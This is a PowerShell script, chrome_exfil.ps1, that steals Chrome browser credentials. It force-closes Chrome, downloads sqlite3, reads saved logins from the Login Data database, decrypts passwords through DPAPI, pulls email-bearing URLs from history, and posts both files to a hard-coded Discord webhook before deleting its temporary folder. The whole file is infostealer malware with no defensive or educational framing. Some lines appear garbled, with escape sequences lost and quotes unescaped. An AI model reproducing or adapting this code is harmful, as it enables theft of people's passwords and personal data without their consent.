# chrome_exfil.ps1 - Chrome Credential Exfiltration with DPAPI Decryption
# Admin required for Chrome database access

$ErrorActionPreference = 'Stop'
$webhookURL = "https://discord.com/api/webhooks/1526301287443071227/aGAUnBc-G-9SQngiOqoprsgjVkdxdjYwAnNmR2PosY2eGI2iYOJNJ1FS_ZJO2IuPajTj"
$tempDir = "$env:TEMP\ChromeExfil"
$logFile = "$tempDir\exfil_log.txt"
$maxRetries = 3
$retryDelay = 2

# Create temp directory
if (-not (Test-Path $tempDir)) { New-Item -ItemType Directory -Path $tempDir -Force | Out-Null }

# Logging function
function Log-Msg { param($msg) Add-Content -Path $logFile -Value "[$(Get-Date -Format 'HH:mm:ss')] $msg" }

Log-Msg "Starting Chrome credential exfiltration..."

# Kill Chrome to avoid file locks
if (Get-Process chrome -ErrorAction SilentlyContinue) {
    Log-Msg "Chrome detected. Killing process..."
    Stop-Process -Name chrome -Force -ErrorAction SilentlyContinue
    Start-Sleep -Seconds 2
}

# Download SQLite tool with retry logic
$zipPath = "$env:TEMP\sqlite.zip"
$sqliteExe = "$env:TEMP\sqlite3.exe"
$retryCount = 0

while ($retryCount -lt $maxRetries) {
    try {
        Invoke-WebRequest -Uri "https://www.sqlite.org/2023/sqlite-tools-win32-x86-3390200.zip" -OutFile $zipPath -UseBasicParsing
        Expand-Archive -Path $zipPath -DestinationPath $env:TEMP -Force
        Move-Item "$env:TEMP\sqlite-tools-win32-x86-3390200\sqlite3.exe" -Destination $sqliteExe -Force -ErrorAction Stop
        Log-Msg "SQLite downloaded and extracted successfully."
        break
    }
    catch {
        $retryCount++
        Log-Msg "SQLite download attempt $retryCount failed: $_"
        if ($retryCount -eq $maxRetries) { throw "SQLite download failed after $maxRetries attempts" }
        Start-Sleep -Seconds $retryDelay
    }
}

# Extract Chrome passwords with retry logic
$decryptedFile = "$tempDir\decrypted_passwords.txt"
$retryCount = 0
$chromeLoginData = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"

while ($retryCount -lt $maxRetries) {
    try {
        $raw = & $sqliteExe $chromeLoginData "SELECT origin_url, username_value, password_value FROM logins"
        $passwords = @()
        foreach ($line in $raw) {
            if ($line -match '^([^|]+)\|([^|]+)\|(.+)$') {
                $url = $matches[1]
                $user = $matches[2]
                $blob = [System.Convert]::FromBase64String($matches[3])
                $plain = [System.Text.Encoding]::UTF8.GetString(
                    [System.Security.Cryptography.ProtectedData]::Unprotect(
                        $blob, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser
                    )
                )
                $passwords += "🔗 URL: $urln👤 Username: $usern🔑 Password: $plainn" + "-"*50 + "n"
            }
        }
        $passwords | Out-File -FilePath $decryptedFile -Encoding UTF8
        Log-Msg "Passwords extracted and decrypted successfully."
        break
    }
    catch {
        $retryCount++
        Log-Msg "Password extraction attempt $retryCount failed: $_"
        if ($retryCount -eq $maxRetries) { throw "Password extraction failed after $maxRetries attempts" }
        Start-Sleep -Seconds $retryDelay
    }
}

# Extract emails from history with retry logic
$emailsFile = "$tempDir\emails.txt"
$retryCount = 0
$chromeHistory = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\History"

while ($retryCount -lt $maxRetries) {
    try {
        & $sqliteExe $chromeHistory "SELECT url FROM urls WHERE url LIKE '%@%'" > $emailsFile
        Log-Msg "Email addresses extracted successfully."
        break
    }
    catch {
        $retryCount++
        Log-Msg "Email extraction attempt $retryCount failed: $_"
        if ($retryCount -eq $maxRetries) { throw "Email extraction failed after $maxRetries attempts" }
        Start-Sleep -Seconds $retryDelay
    }
}

# Send to Discord with proper multipart formatting
try {
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    $content = "🔓 Chrome Credential Exfiltration – $timestamp"

    $boundary = [System.Guid]::NewGuid().ToString()
    $LF = "rn"
    $bodyLines = @()

    $bodyLines += "--$boundary"
    $bodyLines += "Content-Disposition: form-data; name="content""
    $bodyLines += ""
    $bodyLines += $content

    $bodyLines += "--$boundary"
    $bodyLines += "Content-Disposition: form-data; name="file"; filename="passwords.txt""
    $bodyLines += "Content-Type: text/plain"
    $bodyLines += ""
    $bodyLines += [IO.File]::ReadAllText($decryptedFile)

    $bodyLines += "--$boundary"
    $bodyLines += "Content-Disposition: form-data; name="file"; filename="emails.txt""
    $bodyLines += "Content-Type: text/plain"
    $bodyLines += ""
    $bodyLines += [IO.File]::ReadAllText($emailsFile)

    $bodyLines += "--$boundary--"
    $body = $bodyLines -join $LF

    $headers = @{ "Content-Type" = "multipart/form-data; boundary="$boundary"" }

    Invoke-RestMethod -Uri $webhookURL -Method Post -Headers $headers -Body $body
    Log-Msg "Data sent to Discord webhook successfully."
}
catch {
    Log-Msg "Webhook POST failed: $_"
    throw "Webhook transmission failed"
}

# Cleanup
Remove-Item $tempDir -Recurse -Force -ErrorAction SilentlyContinue
Log-Msg "Script completed and cleaned up."